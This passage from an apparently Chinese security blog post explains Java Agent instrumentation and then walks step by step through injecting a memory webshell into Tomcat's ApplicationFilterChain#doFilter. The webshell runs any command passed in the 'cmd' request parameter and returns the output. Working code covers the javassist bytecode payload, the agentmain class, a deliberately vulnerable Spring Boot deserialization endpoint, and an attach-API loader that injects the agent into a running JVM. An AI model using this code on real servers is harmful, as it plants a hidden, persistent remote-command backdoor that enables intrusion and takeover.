ctClass.getDeclaredMethod(<span class="string">&quot;internalDoFilter&quot;</span>);</span><br><span class="line">                ctMethod.insertBefore(<span class="string">&quot;System.out.println(\&quot;sean\&quot;)&quot;</span>);</span><br><span class="line">                <span class="type">byte</span>[] bytecode = ctClass.toBytecode();</span><br><span class="line">                ctClass.detach();</span><br><span class="line">                <span class="keyword">return</span> bytecode;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                System.out.println(e);</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="kQ5T0">getAllLoadedClasses</h5>
getAllLoadedClasses 方法能列出所有已加载的 Class，我们可以通过遍历 Class 数组来寻找我们需要重定义的 class

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span>  <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation inst)</span> &#123;</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> <span class="title class_">DefineTransformer</span>(),<span class="literal">true</span>);</span><br><span class="line">        Class[] allLoadedClasses = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class cls : allLoadedClasses) &#123;</span><br><span class="line">            System.out.println(cls.getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h5 id="eGGV7">retransformClasses</h5>
retransformClasses 方法能对已加载的 class 进行重新定义，也就是说如果我们的目标类已经被加载的话，我们可以调用该函数，来重新触发这个Transformer的拦截，以此达到对已加载的类进行字节码修改的效果

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> &#123;</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> <span class="title class_">DefineTransformer</span>(),<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//获取所有已加载的类</span></span><br><span class="line">        Class[] allLoadedClasses = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class cls : allLoadedClasses) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cls.getName().equals(ClassName))&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;Inject Class exist:&quot;</span> + cls.getName());</span><br><span class="line">                    <span class="comment">//对类进行重新定义</span></span><br><span class="line">                    inst.retransformClasses(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;cls&#125;);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="MjJUl">Demo</h4>
首先利用addTransformer注册一个transformer，然后创建一个ClassFileTransformer抽象类的实现类，重写其transform方法

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        System.out.println(agentArgs);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;premain method is invoked!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 注册 DefineTransformer</span></span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> <span class="title class_">DefineTransformer</span>(),<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们只输出一个className去做测试</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefineTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain,<span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        System.out.println(className);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>PS：如果需要修改已经被JVM加载过的类的字节码，那么还需要在MAINFEST.MF中添加Can-Retransform-Classes: true 或 Can-Redefine-Classes: true</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Can-Retransform-Classes 是否支持类的重新替换</span><br><span class="line">Can-Redefine-Classes 是否支持类的重新定义</span><br></pre></td></tr></table></figure>

<p>当类被加载的时候就会调用 DefineTransformer 中的 transform 方法，然后我们这里的逻辑就是直接输出加载的类的类名</p>
<p>最后利用内存马注入的例子来介绍一下动态修改字节码的一个逻辑</p>
<p>利用JavaAgent注入内存马肯定是需要修改我们指定的类中的某个方法，所以我们这里可以借助 javasist 对字节码进行一个扩充（增加自己的方法）</p>
<p>用 if 做一个判断，表示我们只对特定的 classname 的字节码进行处理</p>
<p>第二个则是利用 javasist 来对字节码进行一个动态修改，这样的话我们的恶意方法就会被添加到 <code>ApplicationFilterChain#doFilter</code> 方法中了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefineTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain,<span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line"></span><br><span class="line">        className = className.replace(<span class="string">&quot;/&quot;</span> , <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(className.equals(ClassName))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Got it!!!&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(ClassName);</span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;doFilter&quot;</span>);</span><br><span class="line">                ctMethod.insertBefore(<span class="string">&quot;javax.servlet.http.HttpServletRequest req = request;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;javax.servlet.http.HttpServletResponse res = response;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;java.lang.String cmd = request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;if(cmd != null)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;try&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;String line;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;StringBuilder sb = new StringBuilder(\&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;while((line = reader.readLine()) != null)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;sb.append(line).append(\&quot;\\n\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&#125;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;response.getOutputStream().println(sb.toString());\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;response.getOutputStream().flush();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;response.getOutputStream().close();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&#125;catch (Exception e)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;e.printStackTrace();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&#125;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">                <span class="type">byte</span>[] bytecode = ctClass.toBytecode();</span><br><span class="line">                ctClass.detach();</span><br><span class="line">                <span class="keyword">return</span> bytecode;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                System.out.println(e);</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="Xmmir">局限性</h4>
大多数情况下，我们使用 Instrumentation 都是使用其字节码插桩的功能，简单来说就是类重定义功能（Class Redefine），但是有以下局限性：

<p>premain 和 agentmain 两种方式修改字节码的时机都是类文件加载之后，也就是说必须要带有 Class 类型的参数，不能通过字节码文件和自定义的类名重新定义一个本来不存在的类。</p>
<p>类的字节码修改称为类转换 (Class Transform)，类转换其实最终都回归到类重定义 <code>Instrumentation#redefineClasses</code> 方法，此方法有以下限制：</p>
<ol>
<li>新类和老类的父类必须相同</li>
<li>新类和老类实现的接口数也要相同，并且是相同的接口</li>
<li>新类和老类访问符必须一致。 新类和老类字段数和字段名要一致</li>
<li>新类和老类新增或删除的方法必须是 private static&#x2F;final 修饰的</li>
<li>可以修改方法体</li>
</ol>
<h2 id="GmJpu">Agent内存马注入</h2>
在正常的实际环境中，我们遇到的情况都是已经在启动中的，premain那种方法并不适合内存马的注入，因此这里我们用agentmain来进行注入内存马

<p>如何动态修改对应类的字节码在上文中已提过，所以我们现在第一件事是需要找到对应的类中的某个方法，这个类中的方法需要满足两个要求</p>
<ol>
<li>该方法一定会被执行</li>
<li>不会影响正常的业务逻辑</li>
</ol>
<h3 id="p3JPi">环境配置</h3>
+ SpringBoot2.6.13
+ CommonCollection3.2.1

<p>这里我用Springboot作为漏洞环境，Controller代码如下，这样一个简单的反序列化环境就搭建完成了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.spring1.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">agentFilter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/cc&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">cc11Vuln</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        java.io.<span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span>  request.getInputStream();</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello,World&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/demo&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">demo</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;This is OK Demo!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="x7064">寻找关键类</h3>
在此之前我们学习过Filter内存马，当我们用户请求到达Servlet前，一定会经过Filter，以此来对我们的请求进行过滤。

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751462984657-86b65fad-2d66-4562-ac02-9226ad5e191e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751462984657-86b65fad-2d66-4562-ac02-9226ad5e191e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在Filter中存在doFilter方法，除了会对我们的请求进行过滤，会依次调用FilterChains中的Filter，同时在 <code>ApplicationFilterChain#doFilter</code> 中还封装了我们用户请求的 request 和 response ，那么如果我们能够注入该方法，那么我们不就可以直接获取用户的请求，将执行结果写在 response 中进行返回。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">ServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> request;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">ServletResponse</span> <span class="variable">res</span> <span class="operator">=</span> response;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.security.AccessController.doPrivileged(</span><br><span class="line">                        (java.security.PrivilegedExceptionAction&lt;Void&gt;) () -&gt; &#123;</span><br><span class="line">                            internalDoFilter(req,res);</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                );</span><br><span class="line">            &#125; ...</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            internalDoFilter(request,response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="tW5lG">反序列化注入</h3>
<font style="color:rgb(51, 51, 51);">注入流程如下：</font>

<ol>
<li><font style="color:rgb(51, 51, 51);">编写 agent.jar 从而实现 </font><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;org.apache.catalina.core.ApplicationFilterChain#doFilter&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);"> 进行字节码修改 </font></li>
<li><font style="color:rgb(51, 51, 51);">利用 CC依赖 的反序列化漏洞将我们的加载代码打进去，然后使其执行来加载我们的 agent.jar </font></li>
</ol>
<h4 id="jwWnT"><font style="color:rgb(51, 51, 51);">第一步</font></h4>
首先注册我们的 DefineTransformer ，然后遍历已加载的 class，如果存在的话那么就调用 retransformClasses 对其进行重定义，AgentMain.java代码如下

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation ins)</span> &#123;</span><br><span class="line">        ins.addTransformer(<span class="keyword">new</span> <span class="title class_">DefineTransformer</span>(),<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 获取所有已加载的类</span></span><br><span class="line">        Class[] classes = ins.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class clas:classes)&#123;</span><br><span class="line">            <span class="keyword">if</span> (clas.getName().equals(ClassName))&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="comment">// 对类进行重新定义</span></span><br><span class="line">                    ins.retransformClasses(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;clas&#125;);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改字节码的关键在于 transformer() 方法，因此我们重写该方法即可</p>
<p>对 transform 拦截的类进行判断，如果被拦截的 classname 等于 <code>ApplicationFilterChain</code> 的话那么就对其进行字节码动态修改，这里我们使用 insertBefore 方法，将其插入到前面，从而减少对原程序的功能破坏</p>
<p>DefineTransformer.java代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefineTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        className = className.replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (className.equals(ClassName))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Find the Inject Class: &quot;</span> + ClassName);</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">c</span> <span class="operator">=</span> pool.getCtClass(className);</span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;doFilter&quot;</span>);</span><br><span class="line">                m.insertBefore(<span class="string">&quot;javax.servlet.http.HttpServletRequest req =  request;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;javax.servlet.http.HttpServletResponse res = response;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;java.lang.String cmd = request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;if (cmd != null)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    try &#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        String line;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        StringBuilder sb = new StringBuilder(\&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        while ((line=reader.readLine()) != null)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;            sb.append(line).append(\&quot;\\n\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getOutputStream().print(sb.toString());\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getOutputStream().flush();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getOutputStream().close();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    &#125; catch (Exception e)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        e.printStackTrace();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">                <span class="type">byte</span>[] bytes = c.toBytecode();</span><br><span class="line">              	<span class="comment">// 将 c 从 classpool 中删除以释放内存</span></span><br><span class="line">                c.detach();</span><br><span class="line">                <span class="keyword">return</span> bytes;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后maven进行打包，这样我们的agent.jar就完成了</p>
<h4 id="xKFjt"> 第二步</h4>
在上一步中，我们已经编写好了agnet.jar，接下来就需要我们编写java代码来将其加载进JVM中

<p>其中大致思路为获取到JVM的PID，调用loadAgent方法将agent.jat注入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    java.lang.<span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;C:\\Users\\xxxxx\\Desktop\\AgentMain-1.0-SNAPSHOT-jar-with-dependencies.jar&quot;</span>;</span><br><span class="line">    java.io.<span class="type">File</span> <span class="variable">toolsPath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.File(System.getProperty(<span class="string">&quot;java.home&quot;</span>).replace(<span class="string">&quot;jre&quot;</span>,<span class="string">&quot;lib&quot;</span>) + java.io.File.separator + <span class="string">&quot;tools.jar&quot;</span>);</span><br><span class="line">    java.net.<span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> toolsPath.toURI().toURL();</span><br><span class="line">    java.net.<span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.net.URLClassLoader(<span class="keyword">new</span> <span class="title class_">java</span>.net.URL[]&#123;url&#125;);</span><br><span class="line">    Class<span class="comment">/*&lt;?&gt;*/</span> MyVirtualMachine = classLoader.loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);</span><br><span class="line">    Class<span class="comment">/*&lt;?&gt;*/</span> MyVirtualMachineDescriptor = classLoader.loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachineDescriptor&quot;</span>);</span><br><span class="line">    java.lang.reflect.<span class="type">Method</span> <span class="variable">listMethod</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;list&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">    java.util.List<span class="comment">/*&lt;Object&gt;*/</span> list = (java.util.List<span class="comment">/*&lt;Object&gt;*/</span>) listMethod.invoke(MyVirtualMachine,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    System.out.println(<span class="string">&quot;Running JVM list ...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;list.size();i++)&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> list.get(i);</span><br><span class="line">        java.lang.reflect.<span class="type">Method</span> <span class="variable">displayName</span> <span class="operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="string">&quot;displayName&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        java.lang.<span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (java.lang.String) displayName.invoke(o,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// 列出当前有哪些 JVM 进程在运行 </span></span><br><span class="line">      	<span class="comment">// 这里的 if 条件根据实际情况进行更改</span></span><br><span class="line">        <span class="keyword">if</span> (name.contains(<span class="string">&quot;com.spring1.Spring1Application&quot;</span>))&#123;</span><br><span class="line">            <span class="comment">// 获取对应进程的 pid 号</span></span><br><span class="line">            java.lang.reflect.<span class="type">Method</span> <span class="variable">getId</span> <span class="operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="string">&quot;id&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">            java.lang.<span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> (java.lang.String) getId.invoke(o,<span class="literal">null</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;id &gt;&gt;&gt; &quot;</span> + id);</span><br><span class="line">            java.lang.reflect.<span class="type">Method</span> <span class="variable">attach</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;attach&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;java.lang.String.class&#125;);</span><br><span class="line">            java.lang.<span class="type">Object</span> <span class="variable">vm</span> <span class="operator">=</span> attach.invoke(o,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;id&#125;);</span><br><span class="line">            java.lang.reflect.<span class="type">Method</span> <span class="variable">loadAgent</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;loadAgent&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;java.lang.String.class&#125;);</span><br><span class="line">            loadAgent.invoke(vm,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;path&#125;);</span><br><span class="line">            java.lang.reflect.<span class="type">Method</span> <span class="variable">detach</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;detach&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">            detach.invoke(vm,<span class="literal">null</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;Agent.jar Inject Success !!&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="bPVMQ">效果实现</h4>
将我们的SpringBoot环境启动起来，然后将上述代码运行，输入以下内容，代表内存马已经注入成功

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751507384838-435b38f6-6f57-47bc-a538-2e3fdc059884.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751507384838-435b38f6-6f57-47bc-a538-2e3fdc059884.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>通过url将cmd参数传入后，可以看到命令执行成功</p>
<p>这里只是正常方式的注入，而实际环境中的大部分环境只能反序列化注入或者jsp文件注入</p>
